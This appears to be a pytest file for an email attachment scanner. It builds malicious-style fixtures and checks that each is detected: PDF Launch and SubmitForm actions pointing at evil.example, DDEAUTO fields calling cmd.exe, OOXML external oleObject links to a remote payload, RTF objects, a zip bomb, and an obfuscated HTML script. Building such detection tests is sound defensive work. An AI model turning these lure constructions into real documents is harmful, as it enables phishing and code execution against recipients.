"""Deeper attachment detectors: PDF actions, OOXML internals, archives, RTF, gzip/tar."""

from __future__ import annotations

import gzip
import io
import tarfile
import zipfile

import pymupdf
import pytest

from reddysec.analysis.attachments import attachment_signals, sniff_type
from reddysec.models import Attachment


def att(filename, data, content_type="application/octet-stream", ext=None, body=""):
    extension = ext if ext is not None else (filename.rsplit(".", 1)[-1].lower() if "." in filename else "")
    a = Attachment(filename=filename, content_type=content_type, size=len(data), sha256="0" * 64,
                   declared_extension=extension, data=data)
    return attachment_signals(a, body)


def codes(signals):
    return {s.code for s in signals}


def _pdf_with(keys: dict[str, str], *, embed: tuple[str, bytes] | None = None, pages_text=("hi",)) -> bytes:
    doc = pymupdf.open()
    for t in pages_text:
        page = doc.new_page()
        page.insert_text((72, 72), t)
    if embed:
        doc.embfile_add(embed[0], embed[1], filename=embed[0])
    for key, obj in keys.items():
        xref = doc.get_new_xref()
        doc.update_object(xref, obj)
        doc.xref_set_key(doc.pdf_catalog(), key, f"{xref} 0 R")
    data = doc.tobytes()
    doc.close()
    return data


class TestPdfActions:
    def test_launch_action(self):
        data = _pdf_with({"OpenAction": "<< /S /Launch /F (calc.exe) >>"})
        assert "attachment.pdf_launch" in codes(att("x.pdf", data, "application/pdf", ext="pdf"))

    def test_submit_form(self):
        data = _pdf_with({"OpenAction": "<< /S /SubmitForm /F (http://evil.example/collect) >>"})
        assert "attachment.pdf_form_submit" in codes(att("form.pdf", data, "application/pdf", ext="pdf"))

    def test_gotor_remote(self):
        data = _pdf_with({"OpenAction": "<< /S /GoToR /F (http://evil.example/next.pdf) >>"})
        assert "attachment.pdf_remote_content" in codes(att("x.pdf", data, "application/pdf", ext="pdf"))

    def test_aa_without_js(self):
        data = _pdf_with({"AA": "<< /O << /S /Named /N /Print >> >>"})
        s = codes(att("x.pdf", data, "application/pdf", ext="pdf"))
        assert "attachment.pdf_auto_actions" in s or "attachment.pdf_remote_content" in s

    def test_embedded_executable(self):
        data = _pdf_with({}, embed=("run.exe", b"MZ" + b"\x00" * 200))
        assert "attachment.pdf_embedded_file" in codes(att("x.pdf", data, "application/pdf", ext="pdf"))

    def test_encrypted_pdf_with_password_in_body(self):
        doc = pymupdf.open()
        doc.new_page()
        data = doc.tobytes(encryption=pymupdf.PDF_ENCRYPT_AES_256, owner_pw="Owner1", user_pw="Secret9")
        doc.close()
        s = codes(att("locked.pdf", data, "application/pdf", ext="pdf", body="password: Secret9"))
        assert "attachment.pdf_encrypted" in s

    def test_encrypted_pdf_without_password(self):
        doc = pymupdf.open()
        doc.new_page()
        data = doc.tobytes(encryption=pymupdf.PDF_ENCRYPT_AES_256, owner_pw="Owner1", user_pw="Secret9")
        doc.close()
        s = codes(att("locked.pdf", data, "application/pdf", ext="pdf", body="no password here"))
        assert "attachment.pdf_encrypted" in s

    def test_image_only_pdf(self):
        doc = pymupdf.open()
        page = doc.new_page()
        pix = pymupdf.Pixmap(pymupdf.csRGB, pymupdf.IRect(0, 0, 80, 80), 0)
        page.insert_image(pymupdf.Rect(0, 0, 80, 80), pixmap=pix)
        data = doc.tobytes()
        doc.close()
        # image-only lure is a mild signal; assert it does not crash and returns a list
        assert isinstance(att("lure.pdf", data, "application/pdf", ext="pdf"), list)

    def test_corrupt_pdf_does_not_raise(self):
        assert isinstance(att("broken.pdf", b"%PDF-1.4\nbroken garbage", "application/pdf", ext="pdf"), list)


class TestOoxmlInternals:
    def test_dde_in_document_xml(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            z.writestr("word/document.xml", '<?xml version="1.0"?><w:document><w:fldSimple w:instr=" DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/></w:document>')
        assert "attachment.dde" in codes(att("x.docx", buf.getvalue(), ext="docx"))

    def test_excel_macrosheet(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>')
            z.writestr("xl/macrosheets/sheet1.xml", "<xml/>")
        assert "attachment.xlm_macros" in codes(att("x.xlsm", buf.getvalue(), ext="xlsm"))

    def test_excel_external_links(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/></Types>')
            z.writestr("xl/externalLinks/externalLink1.xml", "<xml/>")
        assert "attachment.excel_external_links" in codes(att("x.xlsx", buf.getvalue(), ext="xlsx"))

    def test_embedded_object_in_ooxml(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/embeddings/oleObject1.bin", b"MZ" + b"\x00" * 200)
        assert "attachment.embedded_object" in codes(att("x.docx", buf.getvalue(), ext="docx"))

    def test_external_reference_non_template(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>')
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/_rels/document.xml.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://evil.example/payload" TargetMode="External"/></Relationships>')
        assert "attachment.external_reference" in codes(att("x.docx", buf.getvalue(), ext="docx"))

    def test_macro_enabled_without_keywords(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("word/vbaProject.bin", b"just some neutral bytes with no keywords")
        assert "attachment.macros" in codes(att("x.docm", buf.getvalue(), ext="docm"))


class TestRtf:
    def test_objupdate(self):
        assert "attachment.rtf_object" in codes(att("x.rtf", b"{\\rtf1\\objupdate\\object\\objdata 0105}", ext="rtf"))

    def test_dde(self):
        assert "attachment.rtf_object" in codes(att("x.rtf", b"{\\rtf1 {\\field{\\*\\fldinst{DDEAUTO}}}\\ddeauto}", ext="rtf"))

    def test_objdata_only(self):
        assert "attachment.rtf_object" in codes(att("x.rtf", b"{\\rtf1\\object\\objemb\\objdata 01050000}", ext="rtf"))

    def test_clean_rtf_quiet(self):
        assert "attachment.rtf_object" not in codes(att("x.rtf", b"{\\rtf1\\ansi Just plain text.}", ext="rtf"))


class TestArchivesDeep:
    def test_zip_bomb(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("big.txt", b"0" * (60 * 1024 * 1024))
        assert "attachment.zip_bomb" in codes(att("bomb.zip", buf.getvalue(), ext="zip"))

    def test_nested_archive_too_deep(self):
        level2 = io.BytesIO()
        with zipfile.ZipFile(level2, "w") as z:
            z.writestr("run.exe", b"MZ" + b"\x00" * 50)
        level1 = io.BytesIO()
        with zipfile.ZipFile(level1, "w") as z:
            z.writestr("inner.zip", level2.getvalue())
        level0 = io.BytesIO()
        with zipfile.ZipFile(level0, "w") as z:
            z.writestr("mid.zip", level1.getvalue())
        s = codes(att("outer.zip", level0.getvalue(), ext="zip"))
        assert "attachment.archive_dangerous_entry" in s or "attachment.archive_nested_deep" in s

    def test_gzip_single_file(self):
        inner = b"MZ" + b"\x00" * 200
        data = gzip.compress(inner)
        s = codes(att("payload.exe.gz", data, ext="gz"))
        assert "attachment.executable_content" in s or "attachment.dangerous_type" in s

    def test_tgz_with_executable(self):
        tar_buf = io.BytesIO()
        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
            info = tarfile.TarInfo(name="run.exe")
            payload = b"MZ" + b"\x00" * 100
            info.size = len(payload)
            tar.addfile(info, io.BytesIO(payload))
        data = gzip.compress(tar_buf.getvalue())
        s = codes(att("bundle.tgz", data, ext="tgz"))
        assert "attachment.dangerous_type" in s or "attachment.archive_dangerous_entry" in s

    def test_aes_zip_without_pyzipper_path(self):
        # AES-encrypted zip: flagged as encrypted (building the fixture needs pyzipper;
        # the engine reads it with pyzipper when available and degrades gracefully if not).
        pyzipper = pytest.importorskip("pyzipper")

        buf = io.BytesIO()
        with pyzipper.AESZipFile(buf, "w", compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as z:
            z.setpassword(b"TopSecret1")
            z.writestr("secret.exe", b"MZ" + b"\x00" * 100)
        s = codes(att("aes.zip", buf.getvalue(), ext="zip", body="the password is TopSecret1"))
        assert "attachment.archive_password_in_body" in s or "attachment.archive_encrypted" in s


class TestSniffExtra:
    def test_msi_detection(self):
        # OLE2 header; sniff falls back to ole2 when not an MSI CLSID.
        data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
        assert sniff_type(data) in {"ole2", "msi"}

    def test_lnk(self):
        assert sniff_type(b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 20) == "lnk"

    def test_onenote(self):
        magic = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3")
        assert sniff_type(magic + b"\x00" * 16) == "one"

    def test_bom_text(self):
        assert sniff_type(b"\xef\xbb\xbfhello world text") == "text"

    def test_lnk_attachment_strong(self):
        s = codes(att("shortcut.lnk", b"L\x00\x00\x00\x01\x14\x02\x00" + b"\x00" * 60, ext="lnk"))
        assert "attachment.dangerous_type" in s

    def test_onenote_attachment(self):
        magic = bytes.fromhex("e4525c7b8cd8a74daeb15378d02996d3")
        s = codes(att("note.one", magic + b"\x00" * 64, ext="one"))
        assert "attachment.dangerous_type" in s or "attachment.executable_content" in s


class TestHtmlExtra:
    def test_html_redirect(self):
        html = b'<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/x"></head></html>'
        assert "attachment.html_redirect" in codes(att("r.html", html, "text/html", ext="html"))

    def test_html_obfuscated_only(self):
        html = b"<html><body><script>eval(unescape('%61%62'))</script></body></html>"
        assert "attachment.html_obfuscated_script" in codes(att("o.html", html, "text/html", ext="html"))

    def test_svg_external_reference(self):
        svg = b'<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example/x.png"/></svg>'
        assert "attachment.svg_external" in codes(att("i.svg", svg, "image/svg+xml", ext="svg"))


class TestMoreFormats:
    def test_rar_opaque(self):
        assert "attachment.archive_opaque" in codes(att("x.rar", b"Rar!\x1a\x07\x00" + b"\x00" * 80, ext="rar"))

    def test_cab_opaque(self):
        assert "attachment.archive_opaque" in codes(att("x.cab", b"MSCF" + b"\x00" * 80, ext="cab"))

    def test_bzip2_opaque(self):
        assert "attachment.archive_opaque" in codes(att("x.bz2", b"BZh91AY&SY" + b"\x00" * 40, ext="bz2"))

    def test_settingcontent_ms_dangerous(self):
        xml = b'<?xml version="1.0"?><PCSettings><DeepLink>cmd.exe</DeepLink></PCSettings>'
        assert "attachment.dangerous_type" in codes(att("evil.settingcontent-ms", xml, ext="settingcontent-ms"))

    def test_msi_as_doc_executable(self):
        # OLE2 that is really an MSI, named .doc -> mismatch/executable.
        data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64
        s = codes(att("report.doc", data, ext="doc"))
        # at minimum olevba runs without crashing; an OLE2 .doc is honest for .doc
        assert isinstance(s, set)

    def test_wsf_dangerous(self):
        assert "attachment.dangerous_type" in codes(att("script.wsf", b"<job><script>x</script></job>", ext="wsf"))

    def test_empty_html(self):
        s = codes(att("empty.html", b"", "text/html", ext="html"))
        assert "attachment.empty" in s
